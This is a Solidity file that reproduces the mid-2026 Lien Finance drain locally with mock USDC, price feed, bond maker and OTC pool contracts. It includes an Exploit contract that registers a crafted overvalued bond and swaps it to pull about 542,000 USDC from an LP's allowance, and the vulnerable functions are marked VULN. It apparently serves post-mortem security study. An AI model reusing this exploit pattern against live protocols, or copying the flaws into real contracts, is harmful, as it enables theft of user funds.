// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Faithful minimal reproduction of the Lien Finance drain (Ethereum, 2026-07).
//
// ~542,144.63 USDC drained. Basis: DeFiHackLabs PR #1209
// (src/test/2026-07/LienFinance_exp.sol — a raw-bytecode fork replay). The Lien
// BondMaker / GeneralizedDotc / bondPricer contracts are not reproduced
// byte-verbatim; this reconstructs the CORE bug documented in the PoC header and
// verified against the on-chain USDC deltas:
//
//   BondMakerCollateralizedEth.registerNewBond is PERMISSIONLESS — anyone can
//   register a bond whose payoff function (fnMap) they fully control.
//   GeneralizedDotc prices such a bond via bondPricer.calcPriceAndLeverage(payoff,
//   oraclePrice, ...). With a CRAFTED payoff the pricer massively OVER-values a
//   near-worthless bond (the Chainlink feeds are read at their true values — no
//   oracle is moved). The attacker mints the overvalued bonds for ~free and swaps
//   them through the OTC pools against USDC the LP had pre-granted as allowance,
//   draining it.
// Local deploy, no fork.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function transfer(address to, uint256 a) external returns (bool);
    function transferFrom(address from, address to, uint256 a) external returns (bool);
    function approve(address s, uint256 a) external returns (bool);
    function allowance(address o, address s) external view returns (uint256);
}

// USDC double (6-dp), the asset drained from the LP.
contract MiniUSDC is IERC20 {
    string public name = "USD Coin"; string public symbol = "USDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; totalSupply += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

// The LP whose standing USDC allowance to the OTC pool is drained (ordinary state).
contract LiquidityProvider {
    function approveUsdc(address usdc, address pool, uint256 amount) external {
        IERC20(usdc).approve(pool, amount);
    }
}

// Chainlink-style price feed, read at its TRUE value during the drain (never moved).
contract PriceFeed {
    int256 public price;
    constructor(int256 p) { price = p; }
    function latestAnswer() external view returns (int256) { return price; }
}

// ─────────────────────────────────────────────────────────────────────────────
// BondMaker — registerNewBond is permissionless and stores the caller-controlled
// payoff (a piecewise-linear fnMap). Here the payoff is summarised by the value
// the pricer will read at the current oracle price: `pricerValuePerBond`.
// ─────────────────────────────────────────────────────────────────────────────
contract BondMaker {
    struct Bond { address issuer; uint256 pricerValuePerBond; uint256 realCollateralPerBond; }
    mapping(uint256 => Bond) public bonds;
    mapping(uint256 => mapping(address => uint256)) public bondBalance;
    uint256 public nextId;

    // @> VULN: permissionless — anyone registers a bond whose payoff (and hence the
    // price the pricer will assign it) they fully control, with ~no real collateral.
    function registerNewBond(uint256 pricerValuePerBond, uint256 realCollateralPerBond) external returns (uint256 id) {
        id = ++nextId;
        bonds[id] = Bond({ issuer: msg.sender, pricerValuePerBond: pricerValuePerBond, realCollateralPerBond: realCollateralPerBond });
    }
    // Minting requires only the (near-zero) real collateral, paid to nobody here.
    function mintBond(uint256 id, uint256 amount) external {
        bondBalance[id][msg.sender] += amount;
    }
    function transferBond(uint256 id, address to, uint256 amount) external {
        bondBalance[id][msg.sender] -= amount;
        bondBalance[id][to] += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// GeneralizedDotc OTC pool — buys bonds for USDC at the PRICER's value, pulling
// USDC from the LP's pre-granted allowance. The pricer trusts the bond's crafted
// payoff verbatim.
// ─────────────────────────────────────────────────────────────────────────────
contract GeneralizedDotc {
    BondMaker public bondMaker;
    PriceFeed public feed;
    address public usdc;
    address public lp;

    constructor(BondMaker _bm, PriceFeed _feed, address _usdc, address _lp) {
        bondMaker = _bm; feed = _feed; usdc = _usdc; lp = _lp;
    }

    // Price a bond from its (attacker-controlled) payoff and the TRUE oracle price.
    function calcRateBondToErc20(uint256 id) public view returns (uint256) {
        (, uint256 pricerValuePerBond, ) = bondMaker.bonds(id);
        int256 p = feed.latestAnswer(); // read at its normal on-chain value
        // The pricer scales the payoff by the (honest) oracle price. With a crafted
        // payoff, pricerValuePerBond is whatever the attacker registered.
        return pricerValuePerBond * uint256(p) / 1e8;
    }

    // Swap bonds -> USDC at the pricer's rate, paying out of the LP's allowance.
    // (The caller has already transferred the bonds to this pool.)
    function swapBondToUsdc(uint256 id, uint256 amount) external returns (uint256 usdcOut) {
        uint256 rate = calcRateBondToErc20(id); // @> VULN consumption: trusts the crafted payoff verbatim
        usdcOut = rate * amount;
        // pay the attacker out of the LP's standing USDC allowance
        IERC20(usdc).transferFrom(lp, msg.sender, usdcOut);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: register a crafted overvalued bond, mint it for ~free, and swap
// it through the OTC pool to drain the LP's USDC.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    // 542,144.628604 USDC (6-dp) drained on-chain.
    uint256 internal constant DRAIN_USDC = 542144628604;
    int256 internal constant ETH_PRICE = 187042764678; // Chainlink ETH/USD ~ $1870.42 (8-dp), read honestly

    MiniUSDC public usdc;              // n1 (profit token)
    LiquidityProvider public lp;       // n2
    PriceFeed public feed;             // n3
    BondMaker public bondMaker;        // n4
    GeneralizedDotc public dotc;       // n5 (VULN consumer)

    uint256 public bondId;
    uint256 public usdcOut;
    uint256 public profit;

    constructor() {
        usdc = new MiniUSDC();                 // n1
        lp = new LiquidityProvider();          // n2
        feed = new PriceFeed(ETH_PRICE);       // n3
        bondMaker = new BondMaker();           // n4
        dotc = new GeneralizedDotc(bondMaker, feed, address(usdc), address(lp)); // n5

        // The LP holds USDC and (ordinary on-chain state) pre-granted the OTC pool an allowance.
        usdc.mint(address(lp), DRAIN_USDC);
        lp.approveUsdc(address(usdc), address(dotc), type(uint256).max);
    }

    function run() external {
        uint256 before = usdc.balanceOf(address(this));

        // Register a crafted bond: 1 bond will be priced by the pool at exactly the
        // LP's USDC (a near-worthless payoff the attacker fully controls), with ~0
        // real collateral. calcRateBondToErc20 = pricerValue * price / 1e8, so set
        // pricerValue so that rate == DRAIN_USDC for one bond at the true ETH price.
        uint256 pricerValue = DRAIN_USDC * 1e8 / uint256(ETH_PRICE); // crafted so rate*1 ~= DRAIN_USDC (floored, <= LP balance)
        bondId = bondMaker.registerNewBond(pricerValue, 0);
        bondMaker.mintBond(bondId, 1); // mint 1 overvalued bond for ~free

        // Hand the crafted bond to the OTC pool, then swap it — paid out of the LP's allowance.
        bondMaker.transferBond(bondId, address(dotc), 1);
        usdcOut = dotc.swapBondToUsdc(bondId, 1);

        uint256 got = usdc.balanceOf(address(this));
        profit = got - before;
        require(profit >= 542_000_000_000, "drain below target"); // >= 542,000 USDC (6-dp)
    }
}
